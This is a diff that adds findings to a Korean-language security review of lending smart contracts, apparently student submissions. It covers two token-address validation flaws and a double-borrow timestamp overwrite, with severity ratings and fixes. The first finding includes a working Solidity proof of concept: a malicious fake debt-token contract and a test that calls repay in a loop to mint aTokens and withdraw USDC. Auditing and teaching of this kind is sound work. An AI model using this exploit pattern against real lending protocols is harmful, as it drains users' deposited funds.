@@ -53,3 +53,131 @@ function borrow(address tokenAddress, uint256 amount) external payable { //대�
 ### 해결 방안
 - `deposit`시점에 `times`에 timestamp를 저장한다.
 - `borrow`와 `deposit`이 쓰는 `times` 매핑을 분리한다.
+
+## LTeang - Token Address 검증 미흡
+### 설명
+`repay`함수 구현이다.
+```solidity
+function repay(address tokenAddress, uint256 amount) external lock liquidated {
+    DebtToken token = DebtToken(tokenAddress);
+    IERC20 original = IERC20(token.original());
+
+    require(original.balanceOf(msg.sender) >= amount, "Lending: Over than your balances");
+
+    uint interest = token.getLastInterest(msg.sender);
+    uint fee = (interest > amount) ? amount : interest;
+
+    AToken(tokens[address(original)]).updateInterest(fee);
+    token.burn(msg.sender, amount);
+
+    if (token.balanceOf(msg.sender) == 0)
+        AToken(tokens[address(0)]).setGuarantee(msg.sender, false);
+}
+```
+
+tokenAddress에 악의적인 컨태그럭트의 주소를 넣으면, `usdcAToken.updateInterest()`를 원하는 인자로 계속 호출할 수 있다. 이렇게 되면 usdcAToken을 무수히 생성하여 은행에서 usdc를 전부 털어가는 것이 가능해진다.
+
+### PoC
+```solidity
+
+contract MaliciousDToken {
+
+    address _original;
+
+    constructor(address original) {
+        _original = original;
+    }
+    function original() public returns (address) {
+        return _original;
+    }
+
+    function getLastInterest(address user) public returns (uint) {
+        return 1000 ether;
+    }
+
+    function balanceOf(address user) public returns (uint) {
+        return 0;
+    }
+
+    function burn(address user, uint amount) public {
+
+    }
+}
+
+function testExploit() public {
+    MaliciousDToken dt = new MaliciousDToken(address(usdc));
+
+    vm.startPrank(carol);
+    usdc.approve(address(lending), 1000 ether);
+    lending.deposit(address(usdc), 1000 ether);
+    vm.stopPrank();
+    
+    vm.startPrank(alice);
+    vm.deal(alice, 1 ether);
+    usdc.approve(address(lending), 1 ether);
+    lending.deposit(address(usdc), 1 ether);
+    lending.deposit{value: 1 ether}(address(0), 1 ether);
+    lending.borrow(address(usdc), 1 ether);
+
+    IERC20 aUSDCToken = IERC20(lending.getAToken(address(usdc)));
+    uint aBalBefore = aUSDCToken.balanceOf(alice);
+    for (uint i = 0; i < 1000; i++) {
+        lending.repay(address(dt), 1000 ether);
+    }
+    uint aBalAfter = aUSDCToken.balanceOf(alice);
+    console.log(aBalAfter - aBalBefore);
+    lending.withdraw(address(aUSDCToken), 100 ether);
+    }
+```
+
+### 파급력
+lending 서비스의 잔고를 비울 수 있기 때문에 **Critical**로 평가하였다. 
+
+### 해결 방안
+`tokenAddress`에 화이트리스트 기반 필터를 도입한다.
+
+## rkdnd - Token Address 검증 미흡
+### 설명
+```solidity
+function deposit(address tokenAddress, uint256 amount) override public{
+    require(amount <= ERC20(tokenAddress).balanceOf(msg.sender), "InputToken overd own balance");
+    ERC20(tokenAddress)._transfer(msg.sender, address(this), amount);
+
+    _setBalance(tokenAddress, msg.sender, amount);
+    _setTotalSupply();
+}
+```
+
+tokenAddress를, `symbol`이 ETH또는 USDC이고 `_transfer` 함수에서 아무것도 하지 않도록 구성되어 있는 악의적인 컨트랙트 주소로 설정하면, 사용자가 아무런 가치를 지불하지 않았음에도 lending은 balance가 있는 것으로 취급할 것이다. 
+
+### 파급력
+lending 서비스의 돈을 일부(또는 전부) 훔칠 수 있기 때문에 **Critical**로 평가하였다.
+
+### 해결 방안
+앞에서 이야기했던 것과 마찬가지로, `tokenAddress`에 화이트리스트 기반 필터를 도입한다.
+
+## wozz3k - Double Borrow
+### 설명
+`borrow`함수 구현이다.
+```solidity
+function borrow(address tokenAddress, uint256 amount) external
+{
+    require(tokenAddress==usdc_addr, "address value check");
+    require(ERC20(tokenAddress).balanceOf(address(this))>=amount, "landing pool less");
+    uint256 usdc_value = oracle.getPrice(usdc_addr);
+    require(loan_list[msg.sender].bal_eth >= amount*usdc_value*2, "guarantee deposit");
+    loan_list[msg.sender].guarantee = amount*usdc_value*2;
+    loan_list[msg.sender].bal_eth -= amount*usdc_value*2;
+    loan_list[msg.sender].loan_value+=amount;
+    loan_list[msg.sender].time=block.timestamp;
+    ERC20(tokenAddress).transfer(msg.sender, amount);
+}
+```
+
+시간차이를 두고 두 번 대출을 받았을 때, 대출받은 시간 timestamp가 더 나중에 대출받은 것으로 덮여씌워진다. 따라서, 원리합계를 계산하는 곳에서 나중 timestamp만을 사용하여 lending 서비스가 마땅히 받아야 할 이자보다 더 적은 이자를 지불해도 담보를 상환받을 수 있는 취약점이 존재한다.
+
+### 파급력
+lending 서비스의 돈의 극히 일부를 훔칠 수 있기 때문에 **Low**로 평가하였다.
+
+### 해결방안
+double borrow를 원천적으로 금지하거나, loan_value에 amount를 단순히 더하는 것이 아니라 기존 loan_value에 원리합계 공식을 적용한 불어난 값을 넣고, 거기에 amount를 더하는 방식을 사용해야 한다.
